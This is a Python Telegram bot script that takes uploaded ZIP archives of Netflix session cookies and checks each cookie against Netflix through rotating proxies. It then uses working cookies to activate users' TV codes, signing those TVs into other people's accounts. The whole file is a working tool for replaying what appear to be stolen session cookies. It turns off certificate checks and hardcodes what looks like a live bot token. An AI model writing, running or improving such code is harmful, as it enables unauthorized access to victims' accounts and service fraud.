

import asyncio
import io
import os
import random
import re
import string
import sys
import urllib.parse
import zipfile
from datetime import datetime

import requests
from urllib3.exceptions import InsecureRequestWarning
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from telegram.constants import ParseMode

# Load environment variables from .env file
load_dotenv()

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# ══════════════════════════════════════════════════════════════════════
#  CONFIG
# ══════════════════════════════════════════════════════════════════════

BOT_TOKEN = "8521325990:AAGF-_gZXLCFPr-1eTFxBN-7-3PZaBy8R6Y"
ADMIN_IDS = [6177293322]  # Add your Telegram user ID here

COOKIES_DIR = "vault"
PROXY_FILE = "proxy.txt"
REQUEST_TIMEOUT = 15
USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/124.0.0.0 Safari/537.36"
)

REQUIRED_COOKIES = ("NetflixId",)
OPTIONAL_COOKIES = ("SecureNetflixId", "nfvdid", "OptanonConsent")
ALL_COOKIE_NAMES = set(REQUIRED_COOKIES + OPTIONAL_COOKIES)
CANONICAL_NAMES = {name.lower(): name for name in ALL_COOKIE_NAMES}

import threading
cookie_lock = threading.Lock()
stats_lock = threading.Lock()

stats = {
    "total_logins": 0,
    "successful": 0,
    "failed": 0,
    "codes_rejected": 0,
    "started_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
}


# ══════════════════════════════════════════════════════════════════════
#  PROXY
# ══════════════════════════════════════════════════════════════════════

def parse_proxy_line(line):
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    line = re.sub(r"^([a-zA-Z][a-zA-Z0-9+.-]*):/+", r"\1://", line)
    line = re.sub(r"\s+", " ", line).strip()
    m = re.match(
        r"^(?P<scheme>https?|socks5h?|socks4a?)://"
        r"(?:(?P<user>[^:@\s]+):(?P<password>[^@\s]+)@)?"
        r"(?P<host>\[[^\]]+\]|[^:\s]+):(?P<port>\d+)$", line, re.IGNORECASE)
    if m:
        d = m.groupdict()
        host = d["host"].strip().strip("[]")
        url = f"{d['scheme']}://{d['user']}:{d['password']}@{host}:{d['port']}" if d.get("user") else f"{d['scheme']}://{host}:{d['port']}"
        return {"http": url, "https": url}
    m = re.match(r"^(?P<user>[^:@\s]+):(?P<password>[^@\s]+)@(?P<host>[^:\s]+):(?P<port>\d+)$", line)
    if m:
        d = m.groupdict()
        return {"http": f"http://{d['user']}:{d['password']}@{d['host']}:{d['port']}", "https": f"http://{d['user']}:{d['password']}@{d['host']}:{d['port']}"}
    m = re.match(r"^(?P<host>[^:\s]+):(?P<port>\d+)@(?P<user>[^:@\s]+):(?P<password>[^@\s]+)$", line)
    if m:
        d = m.groupdict()
        return {"http": f"http://{d['user']}:{d['password']}@{d['host']}:{d['port']}", "https": f"http://{d['user']}:{d['password']}@{d['host']}:{d['port']}"}
    m = re.match(r"^(?P<host>[^:\s]+):(?P<port>\d+)$", line)
    if m:
        d = m.groupdict()
        return {"http": f"http://{d['host']}:{d['port']}", "https": f"http://{d['host']}:{d['port']}"}
    parts = line.split(":")
    if len(parts) == 4:
        a, b, c, d = parts
        if b.isdigit() and not d.isdigit():
            return {"http": f"http://{c}:{d}@{a}:{b}", "https": f"http://{c}:{d}@{a}:{b}"}
        if d.isdigit() and not b.isdigit():
            return {"http": f"http://{a}:{b}@{c}:{d}", "https": f"http://{a}:{b}@{c}:{d}"}
    for sep in (r"\s+", r"\|", r";", r","):
        m = re.match(rf"^(?P<host>[^:\s]+):(?P<port>\d+){sep}(?P<user>[^:\s]+):(?P<password>\S+)$", line)
        if m:
            d = m.groupdict()
            return {"http": f"http://{d['user']}:{d['password']}@{d['host']}:{d['port']}", "https": f"http://{d['user']}:{d['password']}@{d['host']}:{d['port']}"}
    return None


def load_proxies():
    proxies = []
    if os.path.exists(PROXY_FILE):
        with open(PROXY_FILE, "r", encoding="utf-8") as f:
            for line in f:
                p = parse_proxy_line(line)
                if p:
                    proxies.append(p)
    return proxies


proxies_list = load_proxies()


# ══════════════════════════════════════════════════════════════════════
#  COOKIE EXTRACTION
# ══════════════════════════════════════════════════════════════════════

def canonicalize_name(name):
    return CANONICAL_NAMES.get(str(name or "").strip().lower(), str(name or "").strip())


def is_netflix_cookie(domain, name):
    return canonicalize_name(name) in ALL_COOKIE_NAMES or "netflix." in str(domain or "").lower()


def extract_netscape_entries(raw_text):
    entries = []
    for line in raw_text.splitlines():
        if line.startswith("#HttpOnly_"):
            line = line[len("#HttpOnly_"):]
        parts = line.split("\t")
        if len(parts) < 7:
            parts = re.split(r"\s+", line, maxsplit=6)
        if len(parts) < 7:
            continue
        if parts[1].upper() not in ("TRUE", "FALSE"):
            continue
        if parts[3].upper() not in ("TRUE", "FALSE"):
            continue
        if not re.match(r"^-?\d+(?:\.\d+)?$", parts[4].strip()):
            continue
        name = canonicalize_name(parts[5])
        if not is_netflix_cookie(parts[0], name):
            continue
        entries.append({"name": name, "value": parts[6]})
    return entries


def extract_json_entries(content):
    try:
        data = __import__("json").loads(content)
    except:
        return []
    if isinstance(data, dict):
        data = data.get("cookies") or data.get("items") or [data]
    if not isinstance(data, list):
        return []
    entries = []
    for cookie in data:
        if not isinstance(cookie, dict):
            continue
        name = canonicalize_name(cookie.get("name", ""))
        if not is_netflix_cookie(cookie.get("domain", ""), name):
            continue
        entries.append({"name": name, "value": cookie.get("value", "")})
    return entries


def extract_raw_entries(raw_text):
    pattern = re.compile(
        r"(?:['\"])?(?P<name>" + "|".join(sorted(ALL_COOKIE_NAMES, key=len, reverse=True)) +
        r")(?:['\"])?\s*(?:=|:)\s*(?P<value>\"[^\"]*\"|'[^']*'|[^;\s]+)", re.IGNORECASE)
    entries = []
    for m in pattern.finditer(raw_text):
        name = canonicalize_name(m.group("name"))
        value = m.group("value")
        if len(value) >= 2 and value[0] == value[-1] and value[0] in {"'", '"'}:
            value = value[1:-1]
        else:
            value = value.rstrip(",")
        entries.append({"name": name, "value": value})
    return entries


def extract_cookie_dict(content):
    for extractor in (extract_json_entries, extract_netscape_entries, extract_raw_entries):
        entries = extractor(content)
        if entries:
            break
    else:
        return None
    cookies = {}
    for e in entries:
        if e["name"] not in cookies:
            cookies[e["name"]] = e["value"]
    return cookies if "NetflixId" in cookies else None


# ══════════════════════════════════════════════════════════════════════
#  COOKIE VALIDATION
# ══════════════════════════════════════════════════════════════════════

def validate_cookie(cookies, proxy=None):
    session = requests.Session()
    session.cookies.update(cookies)
    headers = {
        "User-Agent": USER_AGENT,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    }
    try:
        r = session.get(
            "https://www.netflix.com/account/membership",
            headers=headers, proxies=proxy, timeout=REQUEST_TIMEOUT, verify=False,
        )
        if r.status_code != 200:
            return False, None, None
        country = re.search(r'"currentCountry"\s*:\s*"([^"]+)"', r.text)
        if not country:
            country = re.search(r'"countryOfSignup":\s*"([^"]+)"', r.text)
        if not country:
            return False, None, None
        plan = re.search(r'"localizedPlanName"\s*:\s*"([^"]+)"', r.text)
        return True, country.group(1), plan.group(1) if plan else "Unknown"
    except:
        return False, None, None


# ══════════════════════════════════════════════════════════════════════
#  TV ACTIVATION
# ══════════════════════════════════════════════════════════════════════

TV_CODE_ERROR_PATTERNS = [
    r"that code wasn'?t right",
    r"code (is )?(incorrect|invalid|wrong)",
    r"try again",
    r"c[oó]digo (es |que ingresaste |no es |incorrecto|inv[aá]lido)",
    r"ese c[oó]digo no",
    r"int[ée]ntalo de nuevo",
    r"intenta (de )?nuevo",
    r"c[oó]digo (est[aá] |n[aã]o est[aá] |incorreto|inv[aá]lido)",
    r"esse c[oó]digo n[aã]o",
    r"tente novamente",
    r"code (est |n'est pas |incorrect|invalide)",
    r"ce code n'est",
    r"r[ée]essayez",
    r"essayez encore",
    r"code (ist |ung[uü]ltig|falsch)",
    r"versuchen sie es erneut",
    r"codice (non [eè] |sbagliato|non valido)",
    r"riprova",
    r"kod (yanlış|ge[çc]ersiz|hatalı|doğru değil)",
    r"tekrar dene",
    r"الرمز (غير صحيح|خطأ|خاطئ)",
    r"حاول مرة أخرى",
    r"הקוד (שהזנת |שגוי|לא נכון)",
    r"כדאי לנסות שוב",
    r"m[ãa] (đó|không đúng|không ch[íi]nh x[áa]c|sai)",
    r"thử lại",
    r"kod (jest |nieprawidłowy|błędny)",
    r"spr[óo]buj ponownie",
    r"код (неверный|неправильный|ошибочный)",
    r"попробуйте",
    r"代码(有误|错误|无效|不正确)",
    r"请重试",
    r"再试一[次遍]",
    r"代碼(有誤|錯誤|無效|不正確)",
    r"請重試",
    r"再試一[次遍]",
    r"kode (salah|tidak valid|tidak tepat)",
    r"coba lagi",
    r"รหัส(ที่คุณป้อน)?(ไม่ถูกต้อง|ผิด)",
    r"ลองอีกครั้ง",
    r"코드(가|는)?(잘못|틀렸|올바르지 않)",
    r"다시 시도",
    r"コード(が|は)?(間違|違|正しく)",
    r"もう一度",
    r"कोड (गलत|अमान्य)",
    r"पुनः प्रयास",
    r"फिर से",
    r"code (is |niet |onjuist|verkeerd)",
    r"probeer opnieuw",
    r"codul (este |nu este |incorect|gre[sș]it)",
    r"[iî]ncearc[aă] din nou",
    r"a k[oó]d (hib[aá]s|nem megfelel)",
    r"pr[oó]b[aá]ld [uú]jra",
    r"ο κωδικ[οό]ς (είναι |δεν είναι |λάθος|εσφαλμέν)",
    r"δοκιμ[άα]στε ξαν[άα]",
    r"koden (är |stämmer inte |felaktig|ogiltig)",
    r"f[oö]rs[oö]k igen",
    r"koden (er |stemmer ikke |feil|ugyldig)",
    r"pr[oø]v igjen",
    r"koden (er |er ikke |forkert|ugyldig)",
    r"pr[oø]v igen",
    r"koodi (on |ei ole |virheellinen|v[aä][aä]r[aä])",
    r"yrit[aä] uudelleen",
    r"k[oó]d (je |nen[íi] |nespr[aá]vn[yý]|chybn[yý])",
    r"zkuste to znovu",
    r"код (нев[іи]рний|неправильний|помилковий)",
    r"спробуйте (ще раз|знову)",
]


def is_tv_code_error(cleaned_text):
    text_lower = cleaned_text.lower()
    for pattern in TV_CODE_ERROR_PATTERNS:
        if re.search(pattern, text_lower):
            return True
    return False


def is_tv_code_success(final_url, cleaned_text):
    if "/tv/out/success" in final_url.lower():
        return True
    success_patterns = [
        r"tu tv est[aá] lista",
        r"your tv is ready",
        r"sua tv est[aá] pronta",
        r"votre t[ée]l[ée] est pr[eê]t",
        r"dein tv ist bereit",
        r"la tua tv [eè] pronta",
        r"tv'niz hazır",
        r"הטלוויזיה שלך מוכנ",
        r"تلفازك جاهز",
        r"tv của bạn đã sẵn sàng",
        r"tw[oó]j telewizor jest gotowy",
    ]
    for pat in success_patterns:
        if re.search(pat, cleaned_text.lower()):
            return True
    return False


def extract_auth_url(html):
    patterns = [
        r'name="authURL"\s+value="([^"]+)"',
        r'authURL["\']?\s*[:=]\s*["\']([^"]+)["\']',
        r'authURL=([^&\s"\']+)',
        r'["\']authURL["\']\s*:\s*["\']([^"\']+)["\']',
        r'value="(c1\.[^"]+)"',
    ]
    for pat in patterns:
        m = re.search(pat, html)
        if m:
            return urllib.parse.unquote(m.group(1))
    return None


def submit_tv_code(session, tv_code, proxy=None):
    url = "https://www.netflix.com/tv8"
    headers = {
        "User-Agent": USER_AGENT,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    }

    try:
        r = session.get(url, headers=headers, proxies=proxy, timeout=REQUEST_TIMEOUT, verify=False)
        if r.status_code != 200:
            return {"success": False, "error": "Netflix TV page unavailable"}
    except Exception as e:
        return {"success": False, "error": f"Connection failed"}

    auth_url = extract_auth_url(r.text)
    if not auth_url:
        fallback = re.search(r'c1\.[a-zA-Z0-9%+=/]+', r.text)
        if fallback:
            auth_url = fallback.group(0)
        else:
            return {"success": False, "error": "Could not load activation page"}

    form_data = {
        "flow": "websiteSignUp",
        "authURL": auth_url,
        "flowMode": "enterTvLoginRendezvousCode",
        "withFields": "tvLoginRendezvousCode,isTvUrl2",
        "code": tv_code,
        "tvLoginRendezvousCode": tv_code,
        "action": "nextAction",
    }

    post_headers = {
        **headers,
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": "https://www.netflix.com/tv8",
        "Origin": "https://www.netflix.com",
    }

    try:
        r = session.post(
            url, data=form_data, headers=post_headers,
            proxies=proxy, timeout=REQUEST_TIMEOUT, verify=False, allow_redirects=True,
        )
    except Exception as e:
        return {"success": False, "error": "Activation request failed"}

    final_url = r.url if hasattr(r, 'url') else url

    if "/tv/out/success" in final_url.lower():
        return {"success": True, "error": None}

    # Clean text to check for error patterns
    import html as html_mod
    text = r.text
    text = re.sub(r'<script[^>]*>.*?</script>', '', text, flags=re.DOTALL | re.IGNORECASE)
    text = re.sub(r'<style[^>]*>.*?</style>', '', text, flags=re.DOTALL | re.IGNORECASE)
    text = re.sub(r'<[^>]+>', ' ', text)
    text = html_mod.unescape(text)
    text = re.sub(r'\s+', ' ', text).strip()

    if is_tv_code_error(text):
        return {"success": False, "error": "Invalid or expired TV code"}

    if is_tv_code_success(final_url, text):
        return {"success": True, "error": None}

    return {"success": False, "error": "Unknown response from Netflix"}


# ══════════════════════════════════════════════════════════════════════
#  COOKIE VAULT MANAGEMENT
# ══════════════════════════════════════════════════════════════════════

def get_vault_cookies():
    if not os.path.exists(COOKIES_DIR):
        return []
    return [f for f in os.listdir(COOKIES_DIR) if f.lower().endswith((".txt", ".json"))]


def get_random_cookie_file():
    with cookie_lock:
        files = get_vault_cookies()
        if not files:
            return None, None
        filename = random.choice(files)
        filepath = os.path.join(COOKIES_DIR, filename)
        try:
            with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
            os.remove(filepath)
            return filename, content
        except:
            return None, None


def count_vault_cookies():
    return len(get_vault_cookies())


# ══════════════════════════════════════════════════════════════════════
#  ANIMATION
# ══════════════════════════════════════════════════════════════════════

BRAILLE_FRAMES = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
DOTS_FRAMES = ["", ".", "..", "..."]


async def animate_message(context: ContextTypes.DEFAULT_TYPE, chat_id: int, message_id: int, stop_event: asyncio.Event):
    frame_idx = 0
    while not stop_event.is_set():
        frame = BRAILLE_FRAMES[frame_idx % len(BRAILLE_FRAMES)]
        dots = DOTS_FRAMES[(frame_idx // len(BRAILLE_FRAMES)) % len(DOTS_FRAMES)]
        try:
            await context.bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=f"{frame} Checking cookies{dots}\n\nPlease wait...",
            )
        except:
            pass
        frame_idx += 1
        await asyncio.sleep(0.3)


# ══════════════════════════════════════════════════════════════════════
#  BOT COMMANDS
# ══════════════════════════════════════════════════════════════════════

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Welcome message - replied to user's message."""
    user = update.effective_user
    vault_count = count_vault_cookies()
    await update.message.reply_text(
        f"👋 <b>Hey {user.first_name}!</b>\n\n"
        f"🎬 <b>Netflix TV Login Bot</b>\n\n"
        f"📺 Use <code>/tv 12345678</code> to activate your TV\n"
        f"🍪 Cookies in vault: <b>{vault_count}</b>\n\n"
        f"<i>Just send your 8-digit TV code and I'll find a working cookie!</i>",
        parse_mode=ParseMode.HTML,
        reply_to_message_id=update.message.message_id,
    )


async def tv_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /tv {code} command - replied to user's message."""
    user = update.effective_user
    chat_id = update.effective_chat.id
    message_id = update.message.message_id

    args = context.args
    if not args:
        await update.message.reply_text(
            "❌ <b>Usage:</b> <code>/tv 12345678</code>",
            parse_mode=ParseMode.HTML,
            reply_to_message_id=message_id,
        )
        return

    tv_code = re.sub(r'\D', '', args[0])
    if len(tv_code) != 8:
        await update.message.reply_text(
            "❌ TV code must be exactly <b>8 digits</b>",
            parse_mode=ParseMode.HTML,
            reply_to_message_id=message_id,
        )
        return

    if count_vault_cookies() == 0:
        await update.message.reply_text(
            "😔 <b>No cookies left in vault!</b>\n\nWait for admin to upload more.",
            parse_mode=ParseMode.HTML,
            reply_to_message_id=message_id,
        )
        return

    # Send initial status message as reply
    status_msg = await update.message.reply_text(
        f"🔍 <b>Starting TV login...</b>\n\n"
        f"📺 Code: <code>{tv_code}</code>\n"
        f"🍪 Searching vault for a working cookie...",
        parse_mode=ParseMode.HTML,
        reply_to_message_id=message_id,
    )

    # Start animation
    stop_anim = asyncio.Event()
    anim_task = asyncio.create_task(animate_message(context, chat_id, status_msg.message_id, stop_anim))

    # Process in thread pool
    result = await asyncio.to_thread(process_tv_login, tv_code)

    # Stop animation
    stop_anim.set()
    await asyncio.sleep(0.5)

    # Build clean English response
    if result["success"]:
        with stats_lock:
            stats["total_logins"] += 1
            stats["successful"] += 1
        response = (
            f"✅ <b>TV ACTIVATED SUCCESSFULLY!</b>\n\n"
            f"📺 Your Code: <code>{tv_code}</code>\n"
            f"🌍 Account Country: <b>{result.get('country', 'N/A')}</b>\n"
            f"📦 Plan: <b>{result.get('plan', 'N/A')}</b>\n\n"
            f"<i>Your TV is now ready to watch Netflix!</i> 🍿"
        )
    elif result.get("error") == "no_cookies":
        with stats_lock:
            stats["total_logins"] += 1
            stats["failed"] += 1
        response = "😔 <b>All cookies exhausted!</b>\n\nNo working cookies left in vault.\nWait for admin to upload more."
    elif result.get("error") == "all_dead":
        with stats_lock:
            stats["total_logins"] += 1
            stats["failed"] += 1
        response = "❌ <b>No working cookies found!</b>\n\nAll available cookies are dead.\nVault is now empty."
    elif result.get("error") == "Invalid or expired TV code":
        with stats_lock:
            stats["total_logins"] += 1
            stats["codes_rejected"] += 1
        response = (
            f"❌ <b>Invalid or Expired TV Code</b>\n\n"
            f"📺 Code: <code>{tv_code}</code>\n"
            f"🌍 Cookie: <b>{result.get('country', 'N/A')}</b>\n\n"
            f"<i>The code you entered is wrong or expired.\n"
            f"Please check your TV screen and try again with a fresh code.</i>"
        )
    else:
        with stats_lock:
            stats["total_logins"] += 1
            stats["codes_rejected"] += 1
        response = (
            f"❌ <b>Activation Failed</b>\n\n"
            f"📺 Code: <code>{tv_code}</code>\n"
            f"🌍 Cookie: <b>{result.get('country', 'N/A')}</b>\n"
            f"⚠️ Error: {result.get('error', 'Unknown')}\n\n"
            f"<i>Please try again with a fresh code.</i>"
        )

    await status_msg.edit_text(response, parse_mode=ParseMode.HTML)


def process_tv_login(tv_code):
    """Process TV login - runs in thread."""
    proxies = proxies_list
    max_attempts = min(50, max(count_vault_cookies(), 50))
    attempts = 0

    while attempts < max_attempts:
        attempts += 1

        filename, content = get_random_cookie_file()
        if not filename or not content:
            return {"success": False, "error": "no_cookies"}

        cookies = extract_cookie_dict(content)
        if not cookies:
            continue

        proxy = random.choice(proxies) if proxies else None
        valid, country, plan = validate_cookie(cookies, proxy)

        if not valid:
            continue

        # Found valid cookie - try TV activation
        session = requests.Session()
        session.cookies.update(cookies)
        result = submit_tv_code(session, tv_code, proxy)

        result["country"] = country
        result["plan"] = plan
        result["cookie_file"] = filename

        return result

    return {"success": False, "error": "all_dead"}


async def upload_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /upload - admin only."""
    user_id = update.effective_user.id
    message_id = update.message.message_id

    if user_id not in ADMIN_IDS:
        await update.message.reply_text(
            "🚫 <b>Admin only!</b>",
            parse_mode=ParseMode.HTML,
            reply_to_message_id=message_id,
        )
        return

    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        await update.message.reply_text(
            "📎 <b>Usage:</b> Reply to a ZIP file with <code>/upload</code>\n\n"
            "ZIP should contain .txt or .json cookie files.",
            parse_mode=ParseMode.HTML,
            reply_to_message_id=message_id,
        )
        return

    doc = update.message.reply_to_message.document
    if not doc.file_name.lower().endswith('.zip'):
        await update.message.reply_text(
            "❌ Only <b>.zip</b> files are accepted!",
            parse_mode=ParseMode.HTML,
            reply_to_message_id=message_id,
        )
        return

    status_msg = await update.message.reply_text(
        "📥 <b>Downloading...</b>",
        parse_mode=ParseMode.HTML,
        reply_to_message_id=message_id,
    )

    try:
        file = await context.bot.get_file(doc.file_id)
        zip_bytes = await file.download_as_bytearray()

        await status_msg.edit_text("📂 <b>Extracting...</b>", parse_mode=ParseMode.HTML)

        os.makedirs(COOKIES_DIR, exist_ok=True)
        added = 0
        skipped = 0

        with zipfile.ZipFile(io.BytesIO(zip_bytes), 'r') as zf:
            for name in zf.namelist():
                if name.endswith('/') or name.startswith('__MACOSX') or name.startswith('.'):
                    continue
                if not name.lower().endswith(('.txt', '.json')):
                    skipped += 1
                    continue
                try:
                    content = zf.read(name).decode('utf-8', errors='ignore')
                    cookies = extract_cookie_dict(content)
                    if not cookies:
                        skipped += 1
                        continue
                    base = os.path.basename(name)
                    safe_name = re.sub(r'[<>:"/\\|?*]', '_', base)
                    dest = os.path.join(COOKIES_DIR, safe_name)
                    if os.path.exists(dest):
                        suffix = ''.join(random.choices(string.ascii_uppercase + string.digits, k=5))
                        name_part, ext = os.path.splitext(safe_name)
                        dest = os.path.join(COOKIES_DIR, f"{name_part}_{suffix}{ext}")
                    with open(dest, 'w', encoding='utf-8') as f:
                        f.write(content)
                    added += 1
                except:
                    skipped += 1

        vault_count = count_vault_cookies()
        await status_msg.edit_text(
            f"✅ <b>Upload complete!</b>\n\n"
            f"📥 Added: <b>{added}</b> cookies\n"
            f"⏭️ Skipped: <b>{skipped}</b>\n"
            f"🍪 Total in vault: <b>{vault_count}</b>",
            parse_mode=ParseMode.HTML,
        )

    except Exception as e:
        await status_msg.edit_text(f"❌ <b>Error:</b> {str(e)}", parse_mode=ParseMode.HTML)


async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /stats - admin only."""
    user_id = update.effective_user.id
    message_id = update.message.message_id

    if user_id not in ADMIN_IDS:
        await update.message.reply_text(
            "🚫 <b>Admin only!</b>",
            parse_mode=ParseMode.HTML,
            reply_to_message_id=message_id,
        )
        return

    vault_count = count_vault_cookies()

    with stats_lock:
        msg = (
            f"📊 <b>Bot Statistics</b>\n\n"
            f"🍪 <b>Cookies in vault:</b> {vault_count}\n"
            f"🎬 <b>Total logins attempted:</b> {stats['total_logins']}\n"
            f"✅ <b>Successful:</b> {stats['successful']}\n"
            f"❌ <b>Failed (dead cookies):</b> {stats['failed']}\n"
            f"🚫 <b>Codes rejected:</b> {stats['codes_rejected']}\n"
            f"⏰ <b>Bot started:</b> {stats['started_at']}\n"
        )

    await update.message.reply_text(
        msg,
        parse_mode=ParseMode.HTML,
        reply_to_message_id=message_id,
    )


# ══════════════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════════════

def main():
    print("=" * 50)
    print("  Netflix TV Login Bot")
    print("=" * 50)
    print()

    os.makedirs(COOKIES_DIR, exist_ok=True)

    vault_count = count_vault_cookies()
    print(f"[*] Cookies in vault: {vault_count}")
    print(f"[*] Proxies loaded: {len(proxies_list)}")
    print(f"[*] Admin IDs: {ADMIN_IDS}")
    print()

    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("tv", tv_command))
    app.add_handler(CommandHandler("upload", upload_command))
    app.add_handler(CommandHandler("stats", stats_command))

    print("[*] Bot started! Press Ctrl+C to stop.")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Stopped.")
        sys.exit(0)